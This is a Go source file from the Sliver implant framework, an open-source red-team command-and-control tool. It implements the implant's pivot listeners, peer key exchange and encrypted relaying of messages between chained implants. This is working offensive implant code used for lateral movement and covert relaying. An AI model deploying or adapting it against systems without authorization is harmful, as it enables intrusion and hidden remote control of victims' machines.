package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"io"
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	// ErrFailedWrite - Failed to write to a connection
	ErrFailedWrite = errors.New("failed to write")
	// ErrFailedKeyExchange - Failed to exchange session and/or peer keys
	ErrFailedKeyExchange = errors.New("failed key exchange")

	pivotListeners        = &sync.Map{}
	stoppedPivotListeners = &sync.Map{}

	listenerID = uint32(0)

	// MyPeerID - This implant's Peer ID, a per-execution instance ID
	MyPeerID = generatePeerID()

	pivotReadDeadline  = 10 * time.Second
	pivotWriteDeadline = 10 * time.Second
)

// generatePeerID - Generate a new pivot id
func generatePeerID() int64 {
	buf := make([]byte, 8)
	_, err := rand.Read(buf)
	if err != nil {
		return time.Now().UnixNano() // These need only be unique
	}
	peerID := int64(binary.LittleEndian.Uint64(buf))
	if peerID == int64(0) {
		return time.Now().UnixNano()
	}
	return peerID
}

// CreateListener - Generic interface to a start listener function
type CreateListener func(string, chan<- *pb.Envelope, ...bool) (*PivotListener, error)

// GetListeners - Get a list of active listeners
func GetListeners() []*pb.PivotListener {
	listeners := []*pb.PivotListener{}
	pivotListeners.Range(func(key interface{}, value interface{}) bool {
		listener := value.(*PivotListener)
		listeners = append(listeners, listener.ToProtobuf())
		return true
	})
	return listeners
}

// AddListener - Add a listener
func AddListener(listener *PivotListener) {
	// {{if .Config.Debug}}
	log.Printf("[pivot] my peer id: %d", MyPeerID)
	log.Printf("[pivot] adding listener: %s", listener.BindAddress)
	// {{end}}
	pivotListeners.Store(listener.ID, listener)
}

// RemoveListener - Stop a pivot listener
func RemoveListener(id uint32) {
	if listener, ok := pivotListeners.LoadAndDelete(id); ok {
		listener.(*PivotListener).Stop()
	}
}

// RestartAllListeners - Start all pivot listeners
func RestartAllListeners(send chan<- *pb.Envelope) {
	stoppedPivotListeners.Range(func(key, value interface{}) bool {
		stoppedListener := value.(*PivotListener)
		if createListener, ok := SupportedPivotListeners[stoppedListener.Type]; ok {
			listener, err := createListener(stoppedListener.BindAddress, send, stoppedListener.Options...)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[pivot] failed to restart listener: %s", err)
				// {{end}}
				return false
			}
			go listener.Start()
			AddListener(listener)
		}
		return true
	})
	stoppedPivotListeners = &sync.Map{}
}

// StopAllListeners - Stop all pivot listeners
func StopAllListeners() {
	pivotListeners.Range(func(key, value interface{}) bool {
		value.(*PivotListener).Stop()
		return true
	})
	stoppedPivotListeners = pivotListeners
	pivotListeners = &sync.Map{}
}

// StartListener - Stop a pivot listener
func StartListener(id uint32) {
	if listener, ok := pivotListeners.Load(id); ok {
		listener.(*PivotListener).Start()
	}
}

// StopListener - Stop a pivot listener
func StopListener(id uint32) {
	if listener, ok := pivotListeners.Load(id); ok {
		listener.(*PivotListener).Stop()
	}
}

// SendToPeer - Forward an envelope to a peer
func SendToPeer(envelope *pb.Envelope) (bool, error) {
	pivotPeerEnvelope := &pb.PivotPeerEnvelope{}
	err := proto.Unmarshal(envelope.Data, pivotPeerEnvelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to unmarshal peer envelope: %s", err)
		// {{end}}
		return false, err
	}

	// {{if .Config.Debug}}
	log.Printf("my peer envelope: %+v", pivotPeerEnvelope)
	// {{end}}

	nextPeerID, err := findNextPeerID(pivotPeerEnvelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to find next peer id: %s", err)
		// {{end}}
		return false, err
	}

	sent := false // Controls iteration of outer loop
	pivotListeners.Range(func(key interface{}, value interface{}) bool {
		listener := value.(*PivotListener)
		pivotConn, ok := listener.PivotConnections.Load(nextPeerID)
		if ok {
			pivot := pivotConn.(*NetConnPivot)
			pivot.Downstream <- envelope
			sent = true  // break from the outer loop
			return false // stop iterating inner loop
		}
		return !sent // keep iterating while not sent
	})
	if !sent {
		// {{if .Config.Debug}}
		log.Printf("Failed to find peer with id %d", nextPeerID)
		// {{end}}
		return false, errors.New("peer not found")
	}
	return sent, nil
}

func findNextPeerID(pivotPeerEnvelope *pb.PivotPeerEnvelope) (int64, error) {
	for index, peer := range pivotPeerEnvelope.Peers {
		if peer.PeerID == MyPeerID {
			if 0 <= index-1 {
				return pivotPeerEnvelope.Peers[index-1].PeerID, nil
			}
		}
	}
	return int64(0), errors.New("next peer not found")
}

// PivotListener - A pivot listener
type PivotListener struct {
	ID               uint32
	Type             pb.PivotType
	Listener         net.Listener
	PivotConnections *sync.Map // PeerID (int64) -> NetConnPivot
	BindAddress      string
	Upstream         chan<- *pb.Envelope
	Options          []bool
}

// ToProtobuf - Get the protobuf version of the pivot listener
func (l *PivotListener) ToProtobuf() *pb.PivotListener {
	pivotPeers := []*pb.NetConnPivot{}
	l.PivotConnections.Range(func(key interface{}, value interface{}) bool {
		pivot := value.(*NetConnPivot)
		pivotPeers = append(pivotPeers, pivot.ToProtobuf())
		return true
	})
	return &pb.PivotListener{
		ID:          l.ID,
		Type:        l.Type,
		BindAddress: l.BindAddress,
		Pivots:      pivotPeers,
	}
}

// Start - Start the pivot listener
func (p *PivotListener) Start() {
	for {
		conn, err := p.Listener.Accept()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] accept error: %s", err)
			// {{end}}
			return
		}
		// handle connection like any other net.Conn
		pivotConn := &NetConnPivot{
			conn:          conn,
			readMutex:     &sync.Mutex{},
			writeMutex:    &sync.Mutex{},
			readDeadline:  pivotReadDeadline,
			writeDeadline: pivotWriteDeadline,
			upstream:      p.Upstream,
			Downstream:    make(chan *pb.Envelope),
		}
		go pivotConn.Start(p.PivotConnections)
	}
}

// Stop - Stop the pivot listener
func (l *PivotListener) Stop() {
	l.Listener.Close() // Stop accepting new connections

	// Close all existing connections
	connectionIDs := []int64{}
	l.PivotConnections.Range(func(key interface{}, value interface{}) bool {
		connectionIDs = append(connectionIDs, key.(int64))
		return true
	})
	for _, id := range connectionIDs {
		pivotConn, ok := l.PivotConnections.LoadAndDelete(id)
		if ok {
			pivotConn.(*NetConnPivot).Close()
		}
	}
	l.PivotConnections = &sync.Map{} // Make sure we drop any refs
}

// ListenerID - Generate a new pivot id
func ListenerID() uint32 {
	listenerID++
	return listenerID
}

// NetConnPivot - A generic pivot connection to a peer via net.Conn
type NetConnPivot struct {
	downstreamPeerID int64
	conn             net.Conn
	readMutex        *sync.Mutex
	writeMutex       *sync.Mutex
	cipherCtx        *cryptography.CipherContext
	readDeadline     time.Duration
	writeDeadline    time.Duration

	upstream   chan<- *pb.Envelope
	Downstream chan *pb.Envelope
}

// DownstreamPeerID - ID of peer pivot
func (p *NetConnPivot) DownstreamPeerID() int64 {
	return p.downstreamPeerID
}

// ToProtobuf - Protobuf of pivot peer
func (p *NetConnPivot) ToProtobuf() *pb.NetConnPivot {
	return &pb.NetConnPivot{
		PeerID:        p.downstreamPeerID,
		RemoteAddress: p.RemoteAddress(),
	}
}

// Start - Starts the pivot connection handler
func (p *NetConnPivot) Start(pivots *sync.Map) {
	defer func() {
		p.conn.Close()
	}()
	err := p.peerKeyExchange()
	if err != nil {
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[pivot] peer key exchange completed successfully with peer %d", p.downstreamPeerID)
	// {{end}}

	// We don't want to register the peer prior to the key exchange
	// Add & remove self from listener pivots map
	pivots.Store(p.DownstreamPeerID(), p)
	defer pivots.Delete(p.DownstreamPeerID())

	go func() {
		defer close(p.Downstream)
		for {
			envelope, err := p.readEnvelope()
			if err != nil {
				return // Will return when connection is closed
			}
			if envelope.Type == pb.MsgPivotPeerPing {
				// {{if .Config.Debug}}
				log.Printf("[pivot] received peer ping, sending peer pong ...")
				// {{end}}
				p.Downstream <- &pb.Envelope{
					Type: pb.MsgPivotPeerPing,
					Data: envelope.Data,
				}
			} else if envelope.Type == pb.MsgPivotPeerEnvelope {
				// {{if .Config.Debug}}
				log.Printf("[pivot] received peer envelope, upstreaming (%d) ...", envelope.Type)
				// {{end}}
				peerEnvelope := &pb.PivotPeerEnvelope{}
				err := proto.Unmarshal(envelope.Data, peerEnvelope)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[pivot] error un-marshalling peer envelope: %s", err)
					// {{end}}
					continue
				}
				// Append ourselves to the list of peers, and then upstream
				peerEnvelope.Peers = append(peerEnvelope.Peers, &pb.PivotPeer{
					PeerID: MyPeerID,
					Name:   consts.SliverName,
				})
				envelope.Data, _ = proto.Marshal(peerEnvelope)
				p.upstream <- envelope
			} else {
				// {{if .Config.Debug}}
				log.Printf("[pivot] received unknown message type (%d), dropping ...", envelope.Type)
				// {{end}}
				continue
			}
		}
	}()

	for envelope := range p.Downstream {
		err := p.writeEnvelope(envelope)
		if err != nil {
			if p.downstreamPeerID != 0 {
				p.upstream <- &pb.Envelope{
					Type: pb.MsgPivotPeerFailure,
					Data: mustMarshal(&pb.PivotPeerFailure{
						Type:   pb.PeerFailureType_DISCONNECT,
						PeerID: p.downstreamPeerID,
					}),
				}
			}
			return
		}
	}
}

// peerKeyExchange - Exchange session key with peer, it's important that we DO NOT write
// anything to the socket before we've validated the peer's key is properly signed.
func (p *NetConnPivot) peerKeyExchange() error {
	p.conn.SetReadDeadline(time.Now().Add(tcpPivotReadDeadline))
	peerHelloRaw, err := p.read()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] peer read failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	peerHello := &pb.PivotHello{}
	err = proto.Unmarshal(peerHelloRaw, peerHello)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] unmarshal failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	validPeer := cryptography.MinisignVerify(peerHello.PublicKey, peerHello.PublicKeySignature)
	if !validPeer {
		// {{if .Config.Debug}}
		log.Printf("[pivot] invalid peer key")
		// {{end}}
		return ErrFailedKeyExchange
	}
	p.downstreamPeerID = peerHello.PeerID
	sessionKey := cryptography.RandomSymmetricKey()
	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
	ciphertext, err := cryptography.AgeEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] peer encryption failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	peerResponse, _ := proto.Marshal(&pb.PivotHello{
		PublicKey:          []byte(cryptography.PeerAgePublicKey),
		PublicKeySignature: cryptography.PeerAgePublicKeySignature,
		SessionKey:         ciphertext,
	})
	p.conn.SetWriteDeadline(time.Now().Add(tcpPivotWriteDeadline))
	err = p.write(peerResponse)
	p.conn.SetWriteDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] peer write failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	return nil
}

// write - Write a message to the TCP pivot with a length prefix
// it's unlikely we can't write the 4-byte length prefix in one write
// so we fail if we can't, messages may be much longer so we try to
// drain the message buffer if we didn't complete the write
func (p *NetConnPivot) write(message []byte) error {
	p.writeMutex.Lock()
	defer p.writeMutex.Unlock()
	n, err := p.conn.Write(p.lengthOf(message))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error writing message length: %v", err)
		// {{end}}
		return err
	}
	if n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error writing message length: %v", err)
		// {{end}}
		return ErrFailedWrite
	}

	total := 0
	chunk := 1024
	for total < len(message) {
		if total+chunk <= len(message) {
			n, err = p.conn.Write(message[total : total+chunk])
		} else {
			n, err = p.conn.Write(message[total:])
		}
		total += n
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pivot] Error writing message: %v", err)
			// {{end}}
			return err
		}
	}

	return nil
}

func (p *NetConnPivot) read() ([]byte, error) {
	p.readMutex.Lock()
	defer p.readMutex.Unlock()
	dataLengthBuf := make([]byte, 4)

	n, err := io.ReadFull(p.conn, dataLengthBuf)

	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}

	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	if dataLength <= 0 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] read error: %s\n", err)
		// {{end}}
		return nil, errors.New("[pivot] zero data length")
	}
	dataBuf := make([]byte, dataLength)

	n, err = io.ReadFull(p.conn, dataBuf)

	if err != nil || n != dataLength {
		// {{if .Config.Debug}}
		log.Printf("[pivot] read error: %s\n", err)
		// {{end}}
		return nil, err
	}

	return dataBuf, err
}

func (p *NetConnPivot) lengthOf(message []byte) []byte {
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
	return dataLengthBuf.Bytes()
}

// writeEnvelope - Write a complete envelope
func (p *NetConnPivot) writeEnvelope(envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Marshaling error: %s", err)
		// {{end}}
		return err
	}
	data, err = p.cipherCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Encryption error: %s", err)
		// {{end}}
		return err
	}
	return p.write(data)
}

// readEnvelope - Read a complete envelope
func (p *NetConnPivot) readEnvelope() (*pb.Envelope, error) {
	data, err := p.read()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error reading message: %v", err)
		// {{end}}
		return nil, err
	}
	data, err = p.cipherCtx.DecryptWithoutSignatureCheck(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(data, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}
	return envelope, nil
}

// RemoteAddress - Remote address of peer
func (p *NetConnPivot) RemoteAddress() string {
	remoteAddr := p.conn.RemoteAddr()
	if remoteAddr != nil {
		return remoteAddr.String()
	}
	return ""
}

// Close - Close connection to peer
func (p *NetConnPivot) Close() error {
	return p.conn.Close()
}

func mustMarshal(msg proto.Message) []byte {
	data, _ := proto.Marshal(msg)
	return data
}
